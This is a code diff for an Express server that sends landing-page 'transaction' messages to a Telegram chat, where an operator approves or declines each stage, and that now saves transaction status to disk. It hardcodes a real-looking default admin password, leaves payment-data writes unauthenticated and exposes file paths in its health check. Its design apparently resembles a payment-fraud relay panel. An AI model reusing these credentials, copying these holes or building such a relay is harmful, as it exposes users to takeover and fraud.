@@ -7,7 +7,7 @@ app.use(express.json({ limit: '1mb' }));
 app.use(express.static(__dirname));
 
 // ============================================================
-// NO-CACHE HEADERS (so admin edits show up immediately)
+// NO-CACHE HEADERS
 // ============================================================
 app.use((req, res, next) => {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
@@ -16,16 +16,23 @@ app.use((req, res, next) => {
   next();
 });
 
-const BOT_TOKEN = () => process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID   = () => process.env.TELEGRAM_CHAT_ID;
-const ADMIN_USER = () => process.env.ADMIN_USER || 'wise';
-const ADMIN_PASS = () => process.env.ADMIN_PASS || 'koech1976';
+const BOT_TOKEN   = () => process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID     = () => process.env.TELEGRAM_CHAT_ID;
+const ADMIN_USER  = () => process.env.ADMIN_USER || 'wise';
+const ADMIN_PASS  = () => process.env.ADMIN_PASS || 'koech1976';
 
 // ============================================================
-// PAYMENT DATA STORE (for admin ↔ landing page sync)
+// STORAGE PATHS
 // ============================================================
-const PAYMENT_FILE = path.join(__dirname, 'payment-data.json');
+const DATA_DIR = process.env.DATA_DIR || __dirname;
+try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch {}
 
+const PAYMENT_FILE = path.join(DATA_DIR, 'payment-data.json');
+const STATUS_FILE  = path.join(DATA_DIR, 'txn-status.json');
+
+// ============================================================
+// PAYMENT DATA (admin ↔ landing page sync)
+// ============================================================
 app.get('/api/payment', (req, res) => {
   try {
     const raw = fs.readFileSync(PAYMENT_FILE, 'utf8');
@@ -38,6 +45,7 @@ app.get('/api/payment', (req, res) => {
 app.post('/api/payment', (req, res) => {
   try {
     fs.writeFileSync(PAYMENT_FILE, JSON.stringify(req.body, null, 2));
+    console.log('💾 Payment data saved');
     res.json({ ok: true });
   } catch (e) {
     console.error('Payment save failed:', e);
@@ -48,12 +56,39 @@ app.post('/api/payment', (req, res) => {
 // ============================================================
 // TRANSACTION STORE
 // ============================================================
-const transactions = new Map();
+let transactions = new Map();
+
+try {
+  const raw = fs.readFileSync(STATUS_FILE, 'utf8');
+  const obj = JSON.parse(raw);
+  for (const [id, txn] of Object.entries(obj)) transactions.set(id, txn);
+  console.log(`📦 Loaded ${transactions.size} transactions from disk`);
+} catch {
+  console.log('📦 No existing transactions file — starting fresh');
+}
+
+function persistTransactions() {
+  try {
+    const obj = {};
+    for (const [id, txn] of transactions.entries()) obj[id] = txn;
+    fs.writeFileSync(STATUS_FILE, JSON.stringify(obj, null, 2));
+  } catch (e) {
+    console.warn('Could not persist transactions:', e.message);
+  }
+}
 
 setInterval(() => {
   const cutoff = Date.now() - 60 * 60 * 1000;
+  let removed = 0;
   for (const [id, txn] of transactions.entries()) {
-    if (txn.updatedAt < cutoff) transactions.delete(id);
+    if (txn.updatedAt < cutoff) {
+      transactions.delete(id);
+      removed++;
+    }
+  }
+  if (removed) {
+    console.log(`🧹 Cleaned ${removed} old transactions`);
+    persistTransactions();
   }
 }, 5 * 60 * 1000);
 
@@ -126,7 +161,7 @@ async function answerCallback(callbackQueryId, text = '') {
 }
 
 // ============================================================
-// BUILD INLINE KEYBOARD WITH APPROVE / DECLINE BUTTONS
+// APPROVE / DECLINE KEYBOARD
 // ============================================================
 function buildApprovalKeyboard(txnId) {
   return {
@@ -148,18 +183,12 @@ function buildApprovalKeyboard(txnId) {
 app.post('/api/admin/login', (req, res) => {
   try {
     const { username, password } = req.body || {};
-
     if (!username || !password) {
       return res.status(400).json({ ok: false, error: 'Username and password are required.' });
     }
-
     const userMatch = String(username) === String(ADMIN_USER());
     const passMatch = String(password) === String(ADMIN_PASS());
-
-    if (userMatch && passMatch) {
-      return res.json({ ok: true });
-    }
-
+    if (userMatch && passMatch) return res.json({ ok: true });
     return res.status(401).json({ ok: false, error: 'Invalid username or password.' });
   } catch (err) {
     console.error('Admin login error:', err);
@@ -168,15 +197,12 @@ app.post('/api/admin/login', (req, res) => {
 });
 
 // ============================================================
-// API: SEND MESSAGE + REGISTER TRANSACTION (with buttons)
+// API: TELEGRAM SEND
 // ============================================================
 app.post('/api/telegram', async (req, res) => {
   try {
     const { message, txnId, stage, withButtons } = req.body;
-
-    if (!message) {
-      return res.status(400).json({ ok: false, error: 'No message' });
-    }
+    if (!message) return res.status(400).json({ ok: false, error: 'No message' });
 
     if (txnId) {
       const existing = transactions.get(txnId) || {
@@ -192,6 +218,7 @@ app.post('/api/telegram', async (req, res) => {
         at: Date.now()
       });
       transactions.set(txnId, existing);
+      persistTransactions();
     }
 
     const needsButtons = withButtons !== false && txnId && (
@@ -202,7 +229,6 @@ app.post('/api/telegram', async (req, res) => {
     );
 
     const keyboard = needsButtons ? buildApprovalKeyboard(txnId) : null;
-
     const data = await sendTelegram(message, keyboard);
     res.json({ ok: true, telegram: data });
   } catch (err) {
@@ -212,7 +238,7 @@ app.post('/api/telegram', async (req, res) => {
 });
 
 // ============================================================
-// API: PAYMENT REQUEST (marks txn as pending before admin sees it)
+// API: PAYMENT REQUEST
 // ============================================================
 app.post('/api/payment-request', (req, res) => {
   try {
@@ -226,7 +252,9 @@ app.post('/api/payment-request', (req, res) => {
     existing.status = 'pending';
     existing.updatedAt = Date.now();
     transactions.set(txnId, existing);
+    persistTransactions();
 
+    console.log(`📝 Payment request: ${txnId}`);
     res.json({ ok: true });
   } catch (err) {
     console.error('Payment request error:', err);
@@ -257,12 +285,13 @@ app.post('/api/reset/:txnId', (req, res) => {
     txn.updatedAt = Date.now();
     txn.history.push({ stage: txn.stage, status: 'reset', at: Date.now() });
     transactions.set(req.params.txnId, txn);
+    persistTransactions();
   }
   res.json({ ok: true });
 });
 
 // ============================================================
-// TELEGRAM POLLER — handles button taps + text commands
+// TELEGRAM POLLER
 // ============================================================
 let lastUpdateId = 0;
 
@@ -281,7 +310,6 @@ async function pollTelegram() {
       for (const update of data.result) {
         lastUpdateId = update.update_id;
 
-        // --- Handle button taps (callback_query) ---
         if (update.callback_query) {
           const cq = update.callback_query;
           const dataStr = cq.data || '';
@@ -303,40 +331,29 @@ async function pollTelegram() {
             txn.updatedAt = Date.now();
             txn.history.push({ stage: txn.stage, status: 'approved', at: Date.now() });
             transactions.set(txnId, txn);
-
+            persistTransactions();
             await answerCallback(cq.id, '✅ Approved');
-
             const originalText = cq.message?.text || '';
             const updatedText = originalText + `\n\n✅ <b>APPROVED</b> at ${new Date().toLocaleTimeString('en-GB')}`;
-            await editTelegramMessage(
-              cq.message.chat.id,
-              cq.message.message_id,
-              updatedText,
-              null
-            );
+            await editTelegramMessage(cq.message.chat.id, cq.message.message_id, updatedText, null);
+            console.log(`✅ Approved: ${txnId}`);
           } else if (action === 'decline') {
             txn.status = 'declined';
             txn.updatedAt = Date.now();
             txn.history.push({ stage: txn.stage, status: 'declined', at: Date.now() });
             transactions.set(txnId, txn);
-
+            persistTransactions();
             await answerCallback(cq.id, '❌ Declined');
-
             const originalText = cq.message?.text || '';
             const updatedText = originalText + `\n\n❌ <b>DECLINED</b> at ${new Date().toLocaleTimeString('en-GB')}`;
-            await editTelegramMessage(
-              cq.message.chat.id,
-              cq.message.message_id,
-              updatedText,
-              null
-            );
+            await editTelegramMessage(cq.message.chat.id, cq.message.message_id, updatedText, null);
+            console.log(`❌ Declined: ${txnId}`);
           } else if (action === 'status') {
             await answerCallback(cq.id, `Status: ${txn.status} • Stage: ${txn.stage}`);
           }
           continue;
         }
 
-        // --- Handle text commands (fallback) ---
         const msg = update.message || update.edited_message;
         if (!msg || !msg.text) continue;
         if (String(msg.chat.id) !== String(CHAT_ID())) continue;
@@ -352,6 +369,7 @@ async function pollTelegram() {
             txn.updatedAt = Date.now();
             txn.history.push({ stage: txn.stage, status: 'approved', at: Date.now() });
             transactions.set(approveMatch[1], txn);
+            persistTransactions();
             await sendTelegram(`✅ <b>APPROVED</b>\n<code>${approveMatch[1]}</code>`);
           }
         } else if (declineMatch) {
@@ -361,6 +379,7 @@ async function pollTelegram() {
             txn.updatedAt = Date.now();
             txn.history.push({ stage: txn.stage, status: 'declined', at: Date.now() });
             transactions.set(declineMatch[1], txn);
+            persistTransactions();
             await sendTelegram(`❌ <b>DECLINED</b>\n<code>${declineMatch[1]}</code>`);
           }
         } else if (/^\/status(?:@\w+)?$/i.test(text)) {
@@ -403,6 +422,9 @@ app.get('/health', (req, res) => {
     telegramConfigured: !!(BOT_TOKEN() && CHAT_ID()),
     adminConfigured: !!(ADMIN_USER() && ADMIN_PASS()),
     activeTransactions: transactions.size,
+    dataDir: DATA_DIR,
+    paymentFile: PAYMENT_FILE,
+    paymentFileExists: fs.existsSync(PAYMENT_FILE),
     uptime: Math.floor(process.uptime())
   });
 });
@@ -419,6 +441,8 @@ app.listen(PORT, () => {
   console.log(`✅ Server running on port ${PORT}`);
   console.log(`   Telegram configured: ${!!(BOT_TOKEN() && CHAT_ID())}`);
   console.log(`   Admin configured:    ${!!(ADMIN_USER() && ADMIN_PASS())}`);
+  console.log(`   Data dir:            ${DATA_DIR}`);
+  console.log(`   Payment file:        ${PAYMENT_FILE}`);
   console.log(`   Starting Telegram poller...`);
   setTimeout(pollTelegram, 2000);
 });
